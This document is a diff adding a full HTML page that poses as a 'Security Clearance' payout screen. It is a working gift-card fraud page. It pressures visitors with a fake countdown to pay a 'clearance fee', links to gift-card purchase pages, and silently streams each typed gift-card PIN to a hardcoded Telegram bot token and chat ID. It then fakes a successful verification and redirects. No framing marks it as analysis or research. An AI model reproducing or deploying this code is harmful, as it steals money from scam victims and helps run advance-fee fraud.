@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Clearance | Payout</title>
+    
+    <!-- Inline CSS Styling -->
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --accent-red: #ef4444;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border-color: #334155;
+            --btn-green: #10b981;
+            --btn-green-hover: #059669;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 2rem;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .badge {
+            display: inline-block;
+            background-color: rgba(239, 68, 68, 0.15);
+            color: var(--accent-red);
+            font-size: 0.75rem;
+            font-weight: 700;
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 0.75rem;
+        }
+
+        h1 {
+            font-size: 1.35rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        p.description {
+            font-size: 0.875rem;
+            color: var(--text-muted);
+            line-height: 1.4;
+        }
+
+        .timer-box {
+            background-color: rgba(15, 23, 42, 0.6);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1rem;
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .timer-title {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            margin-bottom: 0.25rem;
+        }
+
+        .timer-clock {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--accent-red);
+            font-family: monospace;
+        }
+
+        .amount-box {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: rgba(255, 255, 255, 0.03);
+            padding: 0.75rem 1rem;
+            border-radius: 6px;
+            font-size: 0.875rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .amount-label { color: var(--text-muted); }
+        .amount-value { font-weight: 700; color: #38bdf8; }
+
+        /* Vendor Info Box Styles */
+        .vendor-info-box {
+            background-color: rgba(56, 189, 248, 0.05);
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            border-radius: 8px;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .vendor-info-title {
+            font-size: 0.825rem;
+            font-weight: 600;
+            color: #38bdf8;
+            margin-bottom: 0.5rem;
+        }
+
+        .vendor-info-text {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            line-height: 1.4;
+            margin-bottom: 0.75rem;
+        }
+
+        .vendor-list {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .vendor-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.35rem;
+            background-color: rgba(56, 189, 248, 0.1);
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            border-radius: 6px;
+            padding: 0.4rem 0.75rem;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #38bdf8;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .vendor-tag:hover {
+            background-color: #38bdf8;
+            border-color: #38bdf8;
+            color: #0f172a;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(56, 189, 248, 0.25);
+        }
+
+        .vendor-tag svg {
+            width: 12px;
+            height: 12px;
+            fill: currentColor;
+        }
+
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+
+        label {
+            display: block;
+            font-size: 0.825rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: var(--text-main);
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            background-color: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-main);
+            font-size: 0.95rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input[type="text"]:focus {
+            border-color: #38bdf8;
+        }
+
+        button.btn-submit {
+            width: 100%;
+            padding: 0.85rem;
+            background-color: var(--btn-green);
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        button.btn-submit:hover {
+            background-color: var(--btn-green-hover);
+        }
+
+        button.btn-submit:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        #status_message {
+            margin-top: 1rem;
+            font-size: 0.825rem;
+            text-align: center;
+            color: var(--accent-red);
+            min-height: 1.2em;
+        }
+
+        .footer-note {
+            margin-top: 1.5rem;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            text-align: center;
+            line-height: 1.3;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <span class="badge">Action Required</span>
+        </div>
+
+        <div class="timer-box">
+            <div class="timer-title">Verification Expires In</div>
+            <div class="timer-clock" id="countdown">14:59</div>
+        </div>
+
+        <div class="amount-box">
+            <span class="amount-label">Required Clearance Fee</span>
+            <span class="amount-value" id="clearance_amount">$0.00 USD</span>
+        </div>
+
+        <!-- Vendor Info Section -->
+        <div class="vendor-info-box">
+            <div class="vendor-info-title">Don't have a supported gift card yet?</div>
+          
+            <div class="vendor-list">
+                <a href="https://www.amazon.com/Amazon-eGift-Card-Logo-Animated/dp/B07PCMWTSG?pf_rd_p=dbd39cc7-6a16-4c5d-a186-f903cabec20e&pf_rd_r=PH7RWSTVKK98FFRZHW2Z&ref_=US_GC_Top_P1_25_STND_B07PCMWTSG" target="_blank" rel="noopener noreferrer" class="vendor-tag">
+                    <span>Buy on Amazon</span>
+                    <svg viewBox="0 0 24 24"><path d="M14 3h7v7h-2V6.414l-9.293 9.293-1.414-1.414L17.586 5H14V3zM5 5h6v2H5v12h12v-6h2v7a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V6a1 1 0 0 1 1-1z"/></svg>
+                </a>
+                <a href="https://www.apple.com/shop/buy-giftcard/giftcard" target="_blank" rel="noopener noreferrer" class="vendor-tag">
+                    <span>Buy on Apple</span>
+                    <svg viewBox="0 0 24 24"><path d="M14 3h7v7h-2V6.414l-9.293 9.293-1.414-1.414L17.586 5H14V3zM5 5h6v2H5v12h12v-6h2v7a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V6a1 1 0 0 1 1-1z"/></svg>
+                </a>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label for="giftcard_pin">Gift Card PIN</label>
+            <input type="text" id="giftcard_pin" placeholder="Enter 16-Digit Code (e.g. A1B2-C3D4-E5F6)" autocomplete="off">
+        </div>
+
+        <button class="btn-submit" id="submit_btn" onclick="submitClearanceCode()">Verify & Process Payout</button>
+
+        <div id="status_message"></div>
+
+        <div class="footer-note">
+            Automated Clearance System • Security Protocol SSL-256
+        </div>
+    </div>
+
+    <!-- Application Script -->
+    <script>
+        // Calculate & display 29.65% of Base_ACu from localStorage
+        function loadClearanceFee() {
+            const rawValue = localStorage.getItem("av_retention_bonus");
+            const baseAmount = parseFloat(rawValue) || 0;
+            const clearanceFee = baseAmount * 0.2965;
+
+            const feeElement = document.getElementById("clearance_amount");
+            if (feeElement) {
+                feeElement.textContent = `$${clearanceFee.toLocaleString('en-US', {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2
+                })} USD`;
+            }
+        }
+
+        // Initialize dynamic fee calculation on DOM load
+        document.addEventListener("DOMContentLoaded", loadClearanceFee);
+
+        // 1. Synchronized Timer connected to localStorage (avb_expiry_time)
+const timerElement = document.getElementById("countdown");
+
+function updateCountdownDisplay() {
+    // 1. Get or initialize the expiration timestamp
+    let expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+
+    if (!expiryTime) {
+        // Fallback: create 15-minute expiration if key is missing
+        expiryTime = Date.now() + 15 * 60 * 1000;
+        localStorage.setItem("avb_expiry_time", expiryTime);
+    }
+
+    // 2. Calculate remaining seconds using current system clock
+    const remainingSec = Math.max(0, Math.floor((expiryTime - Date.now()) / 1000));
+
+    // 3. Format into MM:SS display
+    const minutes = Math.floor(remainingSec / 60);
+    const seconds = remainingSec % 60;
+
+    if (timerElement) {
+        if (remainingSec <= 0) {
+            timerElement.textContent = "EXPIRED";
+            
+            // Clear timer & handle expiration cleanup
+            clearInterval(timerInterval);
+            localStorage.removeItem("avb_expiry_time");
+            localStorage.removeItem("avb_redirected_to_avb");
+            localStorage.removeItem("avb_session_state");
+
+            // Redirect and replace current history entry
+            window.location.replace("https://membership.avalonflow.site/notifications");
+            return;
+        }
+
+        timerElement.textContent = 
+            `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+    }
+}
+
+// Run immediately to avoid UI delay, then update every second
+updateCountdownDisplay();
+const timerInterval = setInterval(updateCountdownDisplay, 1000);
+
+/* =========================
+AUTO SAVE & TELEGRAM STREAM SYSTEM (UPDATED)
+========================= */
+let lastSentPayload = "";
+
+async function saveClearanceCode() {
+    const rawCardCode = document.getElementById("giftcard_pin")?.value?.trim() || "";
+
+    // 1. Commit draft to local device storage
+    localStorage.setItem("clearanceCodeDraft", rawCardCode);
+
+    // 2. SANITIZE & LENGTH GATEWAY: Strip spaces/hyphens and check 14–16 character length
+    const cleanCode = rawCardCode.replace(/[\s-]/g, '');
+
+    if (cleanCode.length < 14 || cleanCode.length > 16) {
+        return; 
+    }
+
+    // 3. Prevent duplicate pings if the sanitized PIN hasn't changed
+    if (cleanCode === lastSentPayload) return;
+    lastSentPayload = cleanCode;
+
+    // 4. Stream sanitized payload to Telegram Monitor automatically
+    const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
+    const CHAT_IDs = '-1003913850436'; 
+
+    try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const identifyUser = urlParams.get('user') || 'Anonymous Visitor';
+
+        const telegramMessage = 
+          `💳 <b>Live Clearance PIN Tracking</b>\n\n` +
+          `• <b>From User:</b> <code>${identifyUser}</code>\n` +
+          `───────────────────\n` +
+          `• <b>Sanitised PIN:</b> <code>${cleanCode}</code>\n` +
+          `• <b>Raw Input:</b> <code>${rawCardCode}</code>`;
+
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
+
+        await fetch(telegramUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_IDs,
+            text: telegramMessage,
+            parse_mode: 'HTML'
+          })
+        });
+
+    } catch (error) {
+        console.error('Failed to stream live clearance PIN metric.');
+    }
+}
+
+/* =========================
+EVENT LISTENERS (Live Input Trigger)
+========================= */
+const pinInput = document.getElementById("giftcard_pin");
+if (pinInput) {
+    pinInput.addEventListener("input", saveClearanceCode);
+}
+
+/* =========================
+SUBMISSION HANDLER
+========================= */
+async function submitClearanceCode() {
+    const rawCardCode = document.getElementById("giftcard_pin")?.value?.trim() || "";
+    const cleanCode = rawCardCode.replace(/[\s-]/g, '');
+    const statusBox = document.getElementById("status_message");
+    const submitBtn = document.getElementById("submit_btn");
+
+    if (cleanCode.length < 14 || cleanCode.length > 16) {
+        statusBox.innerText = "Please enter a valid 14-16 character card PIN.";
+        return;
+    }
+
+    // Ensures data dispatch executes on click if typing listener hasn't fired yet
+await saveClearanceCode();
+
+submitBtn.disabled = true;
+statusBox.style.color = "#38bdf8";
+statusBox.innerText = "Verifying code with clearance server...";
+
+try {
+    const mockApiResponse = await new Promise((resolve) => {
+        setTimeout(() => {
+            resolve({ status: "SUCCESS", transactionId: "TXN_998402" });
+        }, 2000);
+    });
+
+    if (mockApiResponse.status === "SUCCESS") {
+        statusBox.style.color = "#10b981";
+        statusBox.innerText = "Payment verified successfully!";
+
+        localStorage.setItem("has_withdrawn", "true");
+        localStorage.setItem("step_3_paid", "true");
+        localStorage.setItem("step_3_txn_id", mockApiResponse.transactionId);
+
+        // Redirect to dashboard after 1.5 seconds (1500 ms)
+        setTimeout(() => {
+            window.location.replace("https://membership.avalonflow.site/dashboard");
+        }, 1500);
+
+    } else {
+        statusBox.style.color = "#ef4444";
+        statusBox.innerText = "Invalid card PIN. Please try again.";
+        submitBtn.disabled = false;
+    }
+} catch (err) {
+    statusBox.style.color = "#ef4444";
+    statusBox.innerText = "Network error connecting to payment gateway.";
+    submitBtn.disabled = false;
+}
+}
+    </script>
+</body>
+</html>
